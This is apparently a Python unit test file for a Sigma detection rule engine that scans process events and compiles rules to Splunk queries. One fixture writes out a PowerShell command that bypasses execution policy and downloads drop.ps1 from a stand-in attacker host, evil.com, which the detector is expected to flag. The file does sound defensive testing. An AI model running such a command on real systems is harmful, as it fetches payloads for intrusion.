import unittest
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from aegisguard.catalogs.sigma_detection_rules import (
    SigmaRuleCompiler,
    SIGMA_CATALOG,
    RuleLevel
)


class TestSigmaDetectionEngine(unittest.TestCase):
    def test_sigma_catalog_populated(self):
        self.assertGreaterEqual(len(SIGMA_CATALOG), 200)

    def test_sigma_event_scan_match(self):
        event = {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest http://evil.com/drop.ps1"
        }
        matches = SigmaRuleCompiler.scan_event(event)
        self.assertGreaterEqual(len(matches), 1)
        self.assertEqual(matches[0].id, "SIG-0001")

    def test_sigma_event_scan_filter_exclusion(self):
        # Even if matches selection, DeployPackage.ps1 is filtered out
        event = {
            "Image": "powershell.exe",
            "CommandLine": "powershell.exe -Command Invoke-WebRequest http://internal.local/DeployPackage.ps1"
        }
        matches = SigmaRuleCompiler.scan_event(event)
        sig1_matches = [m for m in matches if m.id == "SIG-0001"]
        self.assertEqual(len(sig1_matches), 0)

    def test_compile_to_spl(self):
        rule = SIGMA_CATALOG["SIG-0001"]
        spl = SigmaRuleCompiler.compile_to_spl(rule)
        self.assertIn("index=security", spl)
        self.assertIn("CommandLine=", spl)


if __name__ == "__main__":
    unittest.main()
